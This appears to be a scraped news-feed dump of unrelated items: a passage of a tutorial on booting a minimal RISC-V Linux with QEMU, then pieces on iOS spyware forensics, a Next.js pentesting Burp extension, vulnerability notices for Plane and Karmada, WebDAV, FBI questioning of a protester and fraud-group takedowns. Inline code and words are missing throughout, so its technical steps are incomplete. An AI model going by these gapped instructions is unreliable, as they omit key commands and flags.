after all, it knows how to fire up the kernel, and this could simply be a part of the starting process. With QEMU, remember, we’re sort of short circuiting the whole bootloader thing, and with passing the  flag, we let QEMU also wear the bootloader hat here by loading the kernel image into the memory and starting it up. QEMU actually has a flag called  with which you can append to this kernel command line. The command line itself is baked into the config file under  somewhere, I leave it to the reader to search for it, and the QEMU flag basically lets you adjust it with a VM launch, instead of having to rebuild the kernel to tweak the command line. In this case, the command line is just blank by default.I guess this means that  will now write to ?  is basically a way to write out messages from the kernel space. Remember, your typical  from C’s  is meant for running in the user space, not kernel space, so kernel space must have its own solution, and it is .Great, Linux knows there is UART at , just like we established before. Linux can now choose whether to use the SBI interface to drive the UART, or talk to it directly (if the S-mode allows it on that machine, that is). On many platforms, the OS can disregard that a lower level software like BIOS may offer to interact with the hardware, and from what I hear, this actually indeed happens a lot.There’s also a lot of other stuff in the kernel logs:I don’t think we need this? I guess we can go back to the kernel config and not bake this driver into the kernel and thus slim the kernel down. What we’re building here is a generic build, really. We didn’t customize anything and presumably the authors of the default config thought this is a reasonable default that should just run on a lot of different setups, so they probably included a lot of things to be on the safe side. If you’re working on smaller hardware, with less generous memory, CPU, etc. you do have to carefully choose what gets baked into the kernel and what doesn’t.Additionally, this generic build is smart enough to figure out that the console should go to the right UART device, which is really handy for us. Otherwise, we’d probably have to do a bunch of configs like making sure TTY (let’s not overfocus on what this is now) is enabled, we want to enable printing to UART as the kernel boots, etc. All this is basically configurable in the  interface.We’ll keep it simple in this article, and we won’t customize anything in the kernel unless we have to.Scrolling down closer to the bottom of the output, we see this:Whoops, we crashed! The kernel has fallen into a .Remember how we talked that pretty much always Linux needs a filesystem to be useful and how all the “infrastructure on top of infrastructure” is in the user space? Well, we didn’t really pass anything related to the filesystem explicitly and we surely didn’t pass any user space code to serve as the , though we didn’t even get to the latter.You might imagine that the filesystem needs to be on a disk, but that’s not necessarily the case. We’ll talk some other time about filesystems in great detail, but you can really have a filesystem be backed by RAM memory too. And this is actually very often used by Linux, most notably in the boot up phase. When the kernel gets to where it crashed for us just now, in a normal, typical situation, it will find the whole, fully functional filesystem actually loaded into the RAM. If this confuses you, just think about it this way — a disk is just a bunch of bytes, just like RAM is, though RAM is faster but much smaller; conceptually they’re basically the same. Who and how loads this memory?One way is to bake the filesystem directly into the kernel image. In this case, as the kernel loads, so does the initial, memory-backed filesystem, and our system would be ready to go if we had done that. If you don’t want to bulk up your kernel image and you want your initial filesystem to be loaded by some other means, like through a bootloader or something, then you package it separately. In QEMU case, we can shortcircuit things a little bit again, and make it wear a few more hats — we’ll make it also load the initial filesystem into the memory as well. If you’re interested in building the filesystem into the kernel, read the discussion here and try it as an exercise after you’re done with this guide.This initial filesystem has a name: . You’ll often hear it called  too (I imagine  is short for ramdisk?). The latter is how QEMU takes in the filesystem for loading ( flag).The filesystem is packaged as a  archive, which is conceptually similar to , but it’s not the same binary format. Short discussion can be read here.The only real requirement for the  from the kernel is that it has a binary it can start up as the  process, and the first place where the kernel will look for it is at the filesystem root, so the path is . If you have absolutely nothing else on your filesystem, it’s questionably useful, but this is the bare requirement. Let’s start by writing the  process in C. This process can be really anything, Linux won’t stop you from writing a useless , it will happily just execute it. We can go with a ‘hello world’ then?Great, now let’s package it up into a  archive.The  has a single line:We’re building a static binary because we do not want to dynamically depend on the standard C library. The filesystem won’t have it, we’re making a filesystem with  alone.Linux expects the  archive to be built with the  flag.The kernel stil falls into a panic, but a different one!I guess this just means  shouldn’t finish, so it should be easy to fix? Let’s just make it print something every 10 seconds and never stop. Important to note: our output worked, we see a “Hello world” string!We’ll write a new , but let’s also make our  a little more complex too. Let’s remember how we said that  starts up all the other processes on the machine. Wouldn’t it be nice if we actually had some sort of a shell? After all, that’s what we typically have with Linux — shells go well with Linux. We’ll build a useless shell, the one that just tells us what we asked it to do (echoes back the input).Let’s first write the  process. Before it begins looping and printing something every 10 seconds, it has an important job of spawning our “little shell”. The way a process can spawn another process in Linux is through 2 operations:  and .  will start a new process by literally cloning the current process at the moment of . The way the underlying code can differentiate the “parent” and “child” processes after that is by checking the return value of the  operation. If it is 0, this means the process is the child process, and it’s a parent otherwise (-1 is returned in an error case).Next, it’s not useful for us here to just keep executing the  program in 2 different processes. That’s where one of the many  operations come into the picture. When I say there are many  operations available on Linux, I mean there are , , , etc. Take a look at more documentation here, please. We’re going with  here, and the first parameter is which binary do we want to launch. We’ll package our fake shell as the  binary on the root. The rest of the parameters do not really matter (as evidenced by the value of the second parameter). More important, the mechanism of this operation is that we’re calling into the kernel to take whatever is running in the current process and replace it with the program that is loaded for execution from the binary listed as the first parameter. This is how programs get launched on Linux and when you’re working in your Bash shell, and you end up launching a program, this is what happens — a sequence of  and -style calls.We build the  the same way as we did before:For the “shell” we’re building, I want to get a little more creative. Why don’t we write this one in Go instead of old school C?I am able to cross compile this to RISC-V out-of-the-box with my  compiler.Nice thing that I really like about Go is that it’s very easy to reference other remote repositories on GitHub to include libraries, and things get neatly packaged up statically. I’m not going to lie, the  Go binary is pretty thick, weighing in at 1.9M on my machine, compared to only 454K for the statically-linked simple init, but in the days of desktops/laptops/phones with hundreds of GB of storage, if you’re building a distro for these kinds of devices, you may want to consider the tradeoff.Note, there are situations where you may not be able to simply run your Go binary just like that on top of a bare kernel, it could start throwing Go panics all over the place. In order to run Go, you need to build your kernel with the right features in it, futex support feature being one of them (I think I’ve identified only 2 in my past experience). If you encounter any problems running the Go applications and you suspect you may not have the right kernel support, carefully read through the panics and you will be able to identify what is missing. Good news here is that the default config for the RISC-V kernel is good enough for running Go.Let’s update our :The bits in this console excerpt enclosed with triple square brackets are my user-provided input over UART. You can see 3 things interleaved on the UARTOriginal ’s period output every 10 seconds.Output from the .We are using the sole UART device on the virtual machine for all this, but that is not the only reason why everything is mixed up here.  process prints to the standard output, just like  does, and you may not be aware of it, but any sort of print on Linux is a print to an . Standard output, as far as Linux knows, is a file that is opened by a process and you are printing to the standard output by writing to that file. When we -ed the  from , the  the open files from . So they are literally sharing all the standard input and output streams. Even if we had multiple I/O devices that we used on this machine, they’d still be sending outputs over to the same output stream. When  was started, its standard output was set to produce content over to UART, and this behavior was simply inherited by the .And there we have it, we have a pretty useless, but home-made Linux distribution! Go ahead and send it over to your friends! :)Jokes aside, you can make an exercise out of this and implement some sort of a mini shell out of this . Instead of just echoing back the commands given to it, you could make it actually understand what  is. You can even have it fork off a process to execute that elsewhere. Sky is the limit, you’re in the Linux userspace!Let’s just step back a little and see if Linux kernel achieved the initial few promises for us:It’s abstracting away the hardware. Our  and our shell didn’t know anything about the UART. All they knew was they’re writing to some Linux file handle. It happens to be mapped to something abstract in the Linux kernel that invokes the UART driver in the Linux kernel, which may or may not use the SBI under the hood (I have honestly not verified if the kernel removes its dependence on SBI after it boots).It offers some high-level programming paradigms, like filesystems. Our  process located the other binary through the filesystem (the path was trivial, the binary was right in the root, but still, the paradigm is there).There is a pretty clean isolation between the processes running. Once the shell was forked off from the , the processes were basically running independently. The memory was not shared between them and they didn’t have to worry about each other’s memory layout. They did share something else, though, like the file handles, but this is a consequence of how they were launched into running. Linux enables you to actually change some of this behavior, e.g. you can set up some shared memory between the processes, if you explicitly want to.There are many other things the kernel does for us, but let’s just stop here for now and appreciate this. It may not look like a lot, but the kernel gives us a pretty solid, portable infrastructure with which we can develop high level software while often disregarding the complexities of the underlying machine.So what is an operating system?This is now a game of words in my opinion. In my view, what matters is that the reader now has an understanding of what Linux as the kernel is, what “infrastructure” it offers, and what is running in the user space and what is running in the kernel space.Some people may call the kernel itself an operating system, some people will refer to the whole distribution as the operating system, or they may come up with something completely different. I hope that at this point you have a good understanding of what is happening on a machine once Linux is started and where the responsibilities of each component end (or you can at least imagine the boundaries on a more complex system).Bonus section: making an actually useful micro distribution with I thought about wrapping up here, but it wouldn’t make for a flashy demo. Why don’t we instead boot into something that’s actually useful, meaning that you can do things you would typically do on a Linux-based system, like run your , ,  and whatnot. Let’s stick with the kernel we have previously built, and add some useful “infrastructure on top of infrastructure” in the user space domain to make the whole machine more useful.Note: The title of their project mentions Go bootloaders, and this may stump you because as a careful reader, you know that Go programs are not really something you can run on bare metal. These bootloaders are somewhat exotic  bootloaders, meaning that they will actually run on top of a live Linux kernel, and then use this amazing Linux mechanism called  to re-load a different kernel into the memory from user space. We won’t be using these bootloaders for now, we’ll just focus on the other user space goodies they have available, but I thought a quick paragraph here would help the confused readers.The reason why I like the  project is because it’s so insanely easy to use. Its usage is a bit creative though, so there are really 2 steps here:Install  per their instructions. You should end up with a  binary in your .Now to actually generate a functional  with , the easiest way is to clone their Git repo and  your way into the directory that you just cloned. From there, you can cross-compile a fully functional user space set of tools with a single command.I get a few lines of output, the last being:And that’s really it, this  file can now be just ran with QEMU and you’ll boot right into a shell! Go through the  documentation to understand how you can customize this  image you get, including what sort of changes you can make to the  process behavior, but I think the default setup is so amazing to explore with.Wow, this booted really smoothly! Providing the bottom of the UART output.And as you can see by the little  prompt, you’re actually in a shell! ’s  forked off a shell process and gave it the control over the UART.This little shell that  gives even supports Tab-completion! I will say I have encountered some hiccups occassionally with it, it’s definitely not your full blown Bash, but it’s more than just a toy.The standard tools like  seem to be taking the standard flags:One last flashy thing — let’s connect to google.com from this VM with our custom user-land!First, we need to attach a network device. We add -device virtio-net-device,netdev=usernet -netdev user,id=usernet,hostfwd=tcp::10000-:22 to our QEMU CLI. I think the last 2 numbers do not really matter as we won’t be SSH’ing into this machine (maybe you can do that exercise yourself, but I’m afraid it won’t be easy). The default kernel build should indeed bake in the  network device drivers, so this should more or less just work.We’ll need a working IP address, and we’ll use something from  to obtain it. That something requires 3 things present in the kernel config: ,  and . My default settings for the kernel have all that flipped to , so I’m good to go and you should be too, but you can double check just in case. If you have changed any kernel settings, please rebuild the kernel image.Finally, we need to attach an RNG (doesn’t matter what it is) device to our QEMU machine so we can obtain our IP address. We simply add  to our QEMU CLI.Once we’re in, we can run  to see what’s our IP address.Our Ethernet is not set up. Let’s enable IPv4 networking (we don’t need 6). In this little setup, QEMU is running a virtualized network and it embeds a little DHCP server which can dynamically assign IPs (documentation is here). So let’s run a DHCP helper from  for this by runningThe output I got was the following:The QEMU documentation will tell you why pinging won’t work, so let’s not bother with pinging. Let’s just “visit” google.com!You can now read the downloaded  file!You’ll get a lot of obfuscated JavaScript, but this is great! It means we have successfully visited google.com through ! I hope this sparks your imagination to do some other cool things with .You might intuitively understand at this point that some of the most important software of a Linux distro is the package manager. It’s really the gateway to getting the functionality on your machine that you need. What we went through here is more of an embedded flow: we generated these somewhat monolithic software images and if we want to update something, we rebuild the whole image and re-image the device. This doesn’t work for desktops, phones, etc. Package managers are there to update, add or remove the software on our machines. We won’t be talking about them here, just giving them a brief shoutout and you can hopefully imagine from the high level how they work and what do they do.The  we created is definitely just a toy, and in the end it just started some sort of a shell. However, make no mistake about it,  is an incredibly important thing on a Linux system and getting it right is a science. You’ll see a lot of strong opinions on different  systems for Linux online.  doesn’t usually just spawn one process off and call it a day, it can set up a whole bunch of things like different devices, for example. As an exercise, just run  from your -based build and see all those devices set up. A lot of them come from the ’s setup and many are extremely useful. You can then read some of the  source code to see what’s going on there in .The code for this guide is available here, where you can just sync and build the  images.]]></content:encoded></item><item><title>UN Cybercrime Convention to be signed in Hanoi to tackle global offences</title><link>https://databreaches.net/2025/10/25/un-cybercrime-convention-to-be-signed-in-hanoi-to-tackle-global-offences/?pk_campaign=feed&amp;pk_kwd=un-cybercrime-convention-to-be-signed-in-hanoi-to-tackle-global-offences</link><author>Dissent</author><category>databreach</category><pubDate>Sat, 25 Oct 2025 10:53:59 +0000</pubDate><source url="https://databreaches.net/">Recent Data breaches</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>React vs. Backbone in 2025</title><link>https://backbonenotbad.hyperclay.com/</link><author>mjsu</author><category>dev</category><pubDate>Sat, 25 Oct 2025 09:43:54 +0000</pubDate><source url="https://news.ycombinator.com/best">Best of HackerNews</source><content:encoded><![CDATA[
          Look at the two implementations above. The code is roughly the same length. They do exactly the same thing. One was written with a framework from 2010, the other with a framework that's had countless developer hours and a massive ecosystem behind it for over a decade.
        The interesting part is  how much better React is—it's how little progress we've actually made.The Illusion of Simplicity
          React  cleaner. It reads better at first glance. But that readability comes at a cost: you're trading explicit simplicity for abstraction complexity.
        
          The Backbone code is brutally honest about what it's doing. An event fires, a handler runs, you build some HTML, you put it in the DOM. It's verbose, sure, but there's no mystery. A junior developer can trace exactly what happens and when. The mental model is straightforward: "when this happens, do this."
        
          The React code hides a lot. And once you move past simple examples, you hit problems that don't make sense until you understand React's internals.
        
          Your input mysteriously clears itself. Turns out you switched a list item's key from a stable ID to an index, so React thinks it's a completely different component and remounts it, wiping state. Or maybe you forgot that  can't be —React saw it flip from uncontrolled to controlled and reset the input.
        
          You add a  to fetch data, and suddenly your app is stuck in an infinite loop. The dependency array includes an object that gets recreated every render, so React thinks it changed and runs the effect again. Now you need  and  sprinkled everywhere to "stabilize identities," which is a thing you never had to think about before.
        
          Your click handler sees old state even though you just set it. That's a stale closure—the function captured the value from when it was created, and later renders don't magically update it. You either need to put the state in the dependency array (creating a new handler every time) or use functional updates like . Both solutions feel like workarounds.
        
          These aren't edge cases. They're normal problems you hit building moderately complex apps. And debugging them requires understanding reconciliation algorithms, render phases, and how React's scheduler batches updates. Your code "just works" without you needing to understand why it works, which is nice until it breaks.
        
          People say "you need to rebuild React from scratch to really understand it," and they're right. But that's kind of damning, isn't it? You shouldn't need to understand virtual DOM diffing, scheduling priorities, and concurrent rendering to build a password validator.
        
          Backbone might be tedious, but it doesn't lie to you. jQuery is hackable. You can view source, understand it, and add to it easily. It's just DOM methods. React's abstraction layers make that much harder.
        
          We understand the problem: . That's it. That's what both of these implementations are solving.
        
          For massive apps with 1,000 components on the same page, maybe React's complexity is justified. But what the other 99% of apps? What about small apps that just want to do a job and don't need all the magic?
        
          Is there a better model? Something feels as hard and steady as the DOM, but still feels intuitive to write? Something hackable like Backbone and jQuery were, where you can pop open devtools and understand what's happening?

This development poses a serious challenge for forensic investigators and individuals seeking to determine if their devices have been compromised at a time when spyware attacks are becoming more common.The Power of the shutdown.logFor years, the shutdown.log file has been an invaluable, yet often overlooked, artifact in the detection of iOS malware. Located within the Sysdiagnoses in the Unified Logs section (specifically, Sysdiagnose Folder -> system_logs.logarchive -> Extra -> shutdown.log), it has served as a silent witness to the activities occurring on an iOS device, even during its shutdown sequence.In 2021, the publicly known version of Pegasus spyware was found to leave discernible traces within this shutdown.log. These traces provided a critical indicator of compromise, allowing security researchers to identify infected devices. However, the developers behind Pegasus, NSO Group, are constantly refining their techniques, and by 2022 Pegasus had evolved.Pegasus's Evolving Evasion TacticsWhile still leaving evidence in the shutdown.log, their methods became more sophisticated. Instead of leaving obvious entries, they began to completely wipe the shutdown.log file. Yet, even with this attempted erasure, their own processes still left behind subtle traces. This meant that even a seemingly clean shutdown.log that began with evidence of a Pegasus sample was, in itself, an indicator of compromise. Multiple cases of this behavior were observed until the end of 2022, highlighting the continuous adaptation of these malicious actors.Following this period, it is believed that Pegasus developers implemented even more robust wiping mechanisms, likely monitoring device shutdown to ensure a thorough eradication of their presence from the shutdown.log. Researchers have noted instances where devices known to be active had their shutdown.log cleared, alongside other IOCs for Pegasus infections. This led to the conclusion that a cleared shutdown.log could serve as a good heuristic for identifying suspicious devices.Predator's Similar FootprintThe sophisticated Predator spyware, observed in 2023, also appears to have learned from the past. Given that Predator was actively monitoring the shutdown.log, and considering the similar behavior seen in earlier Pegasus samples, it is highly probable that Predator, too, left traces within this critical log file.iOS 26: An Unintended CleanseWith iOS 26 Apple introduced a change—either an intentional design decision or an unforeseen bug—that causes the shutdown.log to be overwritten on every device reboot instead of appended with a new entry every time, preserving each as its own snapshot. This means that any user who updates to iOS 26 and subsequently restarts their device will inadvertently erase all evidence of older Pegasus and Predator detections that might have been present in their shutdown.log.This automatic overwriting, while potentially intended for system hygiene or performance, effectively sanitizes the very forensic artifact that has been instrumental in identifying these sophisticated threats. It could hardly come at a worse time - spyware attacks have been a constant in the news and recent headlines show that high-power executives and celebrities, not just civil society, are being targeted.Identifying Pegasus 2022: A Specific IOCFor those still on iOS versions prior to 26, a specific IOC for Pegasus 2022 infections involved the presence of a /private/var/db/com.apple.xpc.roleaccountd.staging/com.apple.WebKit.Networking entry within the shutdown.log. This particular IOC also revealed a significant shift in NSO Group's tactics: they began using normal system process names instead of easily identifiable, similarly named processes, making detection more challenging.Correlating Logs for Deeper Insight (< iOS 18)For devices running iOS 18 or earlier, a more comprehensive approach to detection involved correlating containermanagerd log entries with shutdown.log events. Containermanagerd logs contain boot events and can retain data for several weeks. By comparing these boot events with shutdown.log entries, investigators could identify discrepancies. For example, if numerous boot events were observed before shutdown.log entries, it suggested that something was amiss and potentially being hidden.Given the implications of iOS 26's shutdown.log handling, it is crucial for users to take proactive steps:Before updating to iOS 26, immediately take and save a sysdiagnose of your device. This will preserve your current shutdown.log and any potential evidence it may contain.Consider holding off on updating to iOS 26 until Apple addresses this issue, ideally by releasing a bug fix that prevents the overwriting of the shutdown.log on boot.]]></content:encoded></item><item><title>What is intelligence?

As detailed in an April 7 Newsweek report on the study, gadolinium-based contrast agents are injected to sharpen MRI images and are typically excreted without causing harm. However, gadolinium particles have been found lingering in the brain, kidneys, blood, and urine years after exposure, and the US Food and Drug Administration links retained gadolinium to nephrogenic systemic fibrosis (NSF).The study specifically identifies a chemical reaction between gadolinium and oxalic acid—a compound found naturally in foods and produced in the body after ingesting vitamin C—as a likely contributor, Newsweek reports. Lab tests showed oxalic acid caused gadolinium to separate from its chelating agent and form nanoparticles capable of infiltrating cells in various organs.Lead author Dr Brent Wagner told Newsweek he personally avoids vitamin C when undergoing MRI with contrast, citing its potential to increase gadolinium reactivity. “Metabolic milieu,” including high oxalic acid levels, could explain why some individuals experience severe symptoms while others do not, he said.According to the article, nearly half of the patients found to have gadolinium traces in the body had received the contrast agent only once, suggesting that individual biology—not dosage—may influence risk. Dr Wagner theorized that nanoparticle formation could trigger a disproportionate immune response, with affected cells sending distress signals that intensify the body’s reaction.The research team is now building an international patient registry to further study gadolinium accumulation. According to the article, the registry will collect blood, urine, hair, and fingernail samples to help identify individuals at greatest risk and understand long-term retention patterns.Read More >>]]></content:encoded></item><item><title>CVE-2025-62716 - Plane Vulnerable to Cross-Site Scripting via Open Redirect in ?next_path Parameter</title><link>https://cvefeed.io/vuln/detail/CVE-2025-62716</link><author></author><category>vulns</category><pubDate>Fri, 24 Oct 2025 20:17:38 +0000</pubDate><source url="https://cvefeed.io/vuln/latest/">CVE Feed High</source><content:encoded><![CDATA[CVE-2025-62716

These server-side functions appear in proxy tools as POST requests with hashed identifiers like  in the  header, making it difficult to understand what each request actually does. When applications have productionBrowserSourceMaps enabled, this Burp extension NextjsServerActionAnalyzer bridges that gap by automatically mapping these hashes to their actual function names.The Problem with Server Action TestingDuring a typical web application assessment, endpoints usually have descriptive names and methods:  clearly indicates its purpose. Next.js server actions work differently. They all POST to the same endpoint, distinguished only by hash values that change with each build. Without tooling, testers must manually track which hash performs which action—a time-consuming process that becomes impractical with larger applications.So we and Claude wrote a BurpSuite plugin to help map actions to function names.The extension's effectiveness stems from understanding how Next.js bundles server actions in production. When productionBrowserSourceMaps is enabled, JavaScript chunks contain mappings between action hashes and their original function names.The tool simply uses flexible regex patterns to extract these mappings from minified JavaScript.# Strict pattern for standard minificationcreateServerReference\)\("([a-f0-9]{40,})",\w+\.callServer,void 0,\w+\.findSourceMapURL,"([^"]+)"\)# Flexible pattern handling various minification stylescreateServerReference[^"]*"([a-f0-9]{40,})"[^"]*"([^"]+)"\s*\)The extension automatically scans proxy history for JavaScript chunks, identifies those containing  calls, and builds a comprehensive mapping of hash IDs to function names.Rather than simply tracking which hash IDs have been executed, it tracks function names. This is important since the same function might have different hash IDs across builds, but the function name will remain constant.For example, if  has a hash of  in one build and  in another, manually tracking these would see these as different actions. The extension recognizes they're the same function, providing accurate unused action detection even across multiple application versions.Automated Testing of Unused ActionsA useful feature of the extension is its ability to transform discovered but unused actions into testable requests. When you identify an unused action like , the extension can automatically:Find a template request with proper Next.js headersReplace the action ID with the unused action's hashCreate a ready-to-test request in Burp RepeaterThis removes the manual work of manually creating server action requests.We recently assessed a Next.js application with dozens of server actions. The client had left productionBrowserSourceMaps enabled in their production environment—a common configuration that includes debugging information in JavaScript files. This presented an opportunity to improve our testing methodology.Using the Burp extension, we:Captured server action requests during normal application usage from the source maps in JavaScript bundlesMapped hashes to functions like  and Discovered unused actions that weren't triggered through the UIThe function name mapping transformed our testing approach. Instead of tracking anonymous hashes, we could see that  mapped to  and  mapped to . This clarity helped us create more targeted test cases.Monitoring proxy history for requests containing  headersDownloading JavaScript files referenced in the applicationParsing source maps when available to extract original function namesCreating a searchable mapping between hash IDs and function namesHighlighting potentially sensitive functions based on naming patternsImagine testing a function that appears as just a hash. Without context, you might hope to come across while enumerating actions and crafting generic test cases. But knowing it maps to  immediately suggests specific authorization and input validation tests. This context-aware testing led to more thorough coverage in less time. You can also filter by function name or hash to quickly pull up requests with that action.The extension also helps tracking which functions changed between builds, ensuring all discovered actions were tested, and using actual function names instead of hashes in findings (as the hashes aren’t super helpful to devs).Of course, this approach does requires productionBrowserSourceMaps to be enabled and function names alone don't reveal vulnerabilities as a well-written applications should remain secure regardless of function disclosure.When source maps are available, it transforms opaque hash identifiers into meaningful function names. While not a vulnerability finder itself, it's a valuable addition to the penetration tester's toolkit for Next.js applications. For teams testing Next.js applications, especially those with source maps enabled, this extension can significantly improve testing workflow and coverage.Check it out! https://github.com/Adversis/NextjsServerActionAnalyzer]]></content:encoded></item><item><title>The Swift SDK for Android</title><link>https://www.swift.org/blog/nightly-swift-sdk-for-android/</link><author>gok</author><category>dev</category><pubDate>Fri, 24 Oct 2025 20:06:52 +0000</pubDate><source url="https://news.ycombinator.com/best">Best of HackerNews</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>Harnessing America&apos;s heat pump moment</title><link>https://www.heatpumped.org/p/harnessing-america-s-heat-pump-moment</link><author>ssuds</author><category>dev</category><pubDate>Fri, 24 Oct 2025 20:05:07 +0000</pubDate><source url="https://news.ycombinator.com/best">Best of HackerNews</source><content:encoded><![CDATA[Editor’s note: This is a guest post by , an entrepreneur and project coordinator at Jetson Home.

AWS made S3 pervasive and now every webapp that needs to store files
assumes you'll be able to connect it S3. This is good for Amazon, but
painful for everyone else.📢 But who is WebDAV useful for?Most people working on personal projects, self-hosting, or just need
filesystem-over-HTTP-ish capabilities do not need S3, they just need a
place for their files behind some form of authentication. I stopped
reaching for S3 and started running from S3 a while ago and I think you
should consider doing the same.Here are my core requirements:ensure those files aren't publicly accessible by defaultrelatively easy to make those files publicHere's what I don't need:versioning (the V in WebDAV is actually versioning, but still...)quotas, but could be done at the filesystem level (e.g., ZFS)many things I can't think of right nowThis list probably resonates with you as well. I just don't think we
should be encouraging people to run Openstack Swift, CEPH, Minio, or
unfinished projects like Garage just to achieve file-storage-over-HTTP.And with Minio recently killing off most of their admin UI and
making people suffer through crafting JSON policy files and uploading
them with the  tool... just let it go. It's not worth your time.How would you access WebDAV to manage files if you've never tried before?
Lots of tools support it:MacOS Finder ( enter ) and iOS
  FilesWindows Explorer (Map Network Drive, Connect to a Web site...)Popular things like CyberDuck, WinSCP, Filezilla...It's broadly available as you can see even though it's considered by
many to be archaic or obsolete. Your webserver that you're running
probably already supports it and you just need to integrate auth and
setup a vhost / domain for it: Apache, Nginx, Caddy, Lighttpd, IIS ...
You'll even find support in OwnCloud/NextCloud too.In fact, you're already using WebDAV and you just don't realize it. This
is how your contacts and calendars are synced on your devices. The CardDAV
and CalDAV protocols are somewhat like extensions to WebDAV so it suits those
purposes more efficiently, and they are not likely to go away any time
soon.So here's how I'm using it with Apache. I already have a few things that
work optimally in Apache so I didn't choose another webserver, but I
will note that Caddy probably has the simplest configuration
for ensuring individual users get dropped into a private directory. A
lot of out-of-the-box WebDAV solutions will be exposing all of
the files to anyone who can authenticate which is silly, but it's
solvable. I'll admit that Apache's config is probably the most
convoluted and verbose to achieve a multi-user setup with some semblance
of privacy, but it's not impossible.My setup is using LDAP auth, but you can plug in your own obviously.dav_modulelibexec/apache24/mod_dav.so

Two special agents greeted him, introducing themselves only as “James” and “Keith.” They didn’t offer their own last names, but they knew Miles’ — as well as his home address, his social media handles, what car he owns, and, unbeknownst to him, his political activities.“We came out here to ask you questions regarding a protest that happened on the the 11th of June,” one of the agents said in an exchange captured on a Ring camera and provided to me by Serafini. “We’ve been just basically going around asking questions for a few people … and your name was brought up.”The suggestion that his name “was brought up,” puzzled Serafini, who told me he didn’t know anyone at the protest, which he’d learned about from a post on social media. When he asked the agents how they knew who he was, they wouldn’t say — though one agent, Serafini said, later told him that they knew “way more about me than I’d think.”The exact scale of these FBI questionings is unclear, but I’ve heard similar accounts involving protesters in Portland and Chicago. (The FBI declined to comment on Serafini’s account, citing the government shutdown.)Serafini attended an anti-ICE protest around an ICE facility in June so he could express his opposition to the deportations, he told me. “ICE is impacting our community and people aren’t happy,” Serafini said. “People see people around them being kidnapped and shipped away in cages and they show up to protest — It’s as easy as that.”throwing objectsWindows of the ICE facility and adjacent buildings were broken and spray-painted with graffiti. A number of businesses nearby boarded up or posted signs distancing themselves from ICE operations. Tucson Police later announced that three people were taken into custody for charges including unlawful assembly, resisting arrest, obstructing a public thoroughfare and disorderly conduct — and said that their investigation could lead to more arrests.presidential directive NSPM-7directiveAfter 9/11, as the FBI reoriented itself to fighting terror groups like al Qaeda, they focused on identifying and locating individuals and then mapping out their networks of family, friends and associates. That’s the Trump administration approach to Antifa, imagining an organization network that encompasses everything from membership cards to elaborate funding.This approach was evident to Serafini, who told me: “I could tell by their questioning that they were trying to figure out the shadowy entity behind the protest.”He added: “What a waste of their time to go after shit that doesn’t exist.”The FBI seemed more interested in who was behind the protest than the protest itself, with the agents repeatedly asking about who had produced the protest signs, he explained.“They wanted to know where they were from and who supplied them,” Serafini said. “Nothing about what was actually on them.”The signage has become a point of interest to the Trump administration. At a roundtable event on Antifa earlier this month, President Trump pointed to the quality of the signs as evidence that the protests must be funded by unseen benefactors. “When you see the signs, and they’re all made out of a beautiful, beautiful paper. Beautiful, nice, stiff, very expensive paper with beautiful wood handles all the same. All the same color. They come from very expensive printing machines. These are are people that write out their signs in a basement, that believe in something. These are paid anarchists.”Attorney General Pam Bondi echoed the same sentiment recently. “That’s one of the things about Antifa," Bondi said on Fox News earlier this month. “You’re seeing people out there with thousands of signs that all match — pre-bought, pre-put together — they’re organized and someone is funding it.”The administration is convinced that these protests aren’t spontaneous, and because of NSPM-7, the FBI has to prioritize collecting intelligence to show that. Serafini said that a particular focus of the FBI agents was whether the violence at the protest had been premeditated; and he when he told them it all seemed spontaneous, they implied he was lying.“They asked me if the violence (rocks, paint balloons) seemed spontaneous or premeditated. I told them it seemed spontaneous once the ICE agents escalated. They brought up that some protestors showed up with riot shields, so they questioned why they would bring shields if violence wasn’t premeditated. And they kept drilling me on the fact that I showed up alone, [that I didn’t] remember where I saw the flyer, and didn’t know anybody there. They told me that’s unusual and pretty suspicious — as if I was holding back information about whoever organized the protest. They kept insinuating that I was lying to them.”“They showed me photos of several protestors … and tried to get information on them. They said ICE officers were badly injured and that these were the real suspects they needed info on. I told them I had no idea who they were. They seemed frustrated by that, but it’s the truth.”According to Serafini, the two FBI agents showed him photos of himself at the protest as well as several other protesters — people he knew nothing about. The agents asked him for his cell phone, but he refused. The questioning lasted about an hour. Serafini said they left him with a chilling message: that they couldn’t guarantee this would be the last time they saw him.The agents may not have learned anything from Serafini, but the visit — which took place one day before the No Kings protest — did accomplish one thing: Serafini decided against going to No Kings. He was spooked.That is exactly the chilling effect on speech that the FBI investigating political matters risks creating. Edited by William M.

Karmada Dashboard is a general-purpose, web-based control panel for Karmada which is a multi-cluster management project. Prior to version 0.2.0, there is an authentication bypass vulnerability in the Karmada Dashboard API. The backend API endpoints (e.g., /api/v1/secret, /api/v1/service) did not enforce authentication, allowing unauthenticated users to access sensitive cluster information such as Secrets and Services directly. Although the web UI required a valid JWT for access, the API itself remained exposed to direct requests without any authentication checks. Any user or entity with network access to the Karmada Dashboard service could exploit this vulnerability to retrieve sensitive data.

The network operated 1,200 SIM-box devices containing some 40,000 SIM cards, enabling criminals to rent phone numbers registered to individuals in more than 80 countries. These were then used to create 49 million fraudulent online accounts for crimes including phishing, investment fraud, extortion, impersonation, and migrant smuggling.The illegal service, run through  and , worked by selling access to “fast and secure temporary” phone numbers marketed for anonymous communication and account verification. GoGetSMS also offered users a way to monetize their own SIM cards. However, reviews suggested it was a front for large-scale identity fraud, , which allowed perpetrators worldwide to hide their identities while conducting telecom-based fraud.After running coordinated raids across Austria, Estonia, Finland, and Latvia, police arrested seven suspects in total. They also seized five servers, the two websites, hundreds of thousands of SIM cards, €431,000 deposited in bank accounts, €266,000 in crypto, and four luxury vehicles. Both domains have been taken down and now display official law enforcement banners.So far, authorities have linked the network to 1,700 fraud cases in Austria and 1,500 in Latvia, with combined losses adding up to nearly €5 million. Europol’s forensic analysis of the seized servers aims to identify customers of the illegal service.The Bad | Jingle Thief Exploits Cloud Identities for Large-Scale Gift Card FraudA new report from security researchers details the activities of . Active since at least 2021, the group targets retail and consumer services organizations through phishing and smishing campaigns designed to steal Microsoft 365 credentials.Once inside, the attackers exploit cloud-based infrastructure to impersonate legitimate users, gain unauthorized access to sensitive data, and manipulate gift card issuance systems. With their campaigns focusing on mapping cloud networks, attackers can move laterally across accounts and avoid detection through stealthy tactics such as creating inbox rules, forwarding emails, and registering rogue authenticator apps to bypass MFA in M365.Unlike traditional malware-driven attacks, . This approach allows them to maintain access for many months while issuing or selling unauthorized gift cards for profit on gray markets.Researchers also observed a major wave of Jingle Thief activity between April and 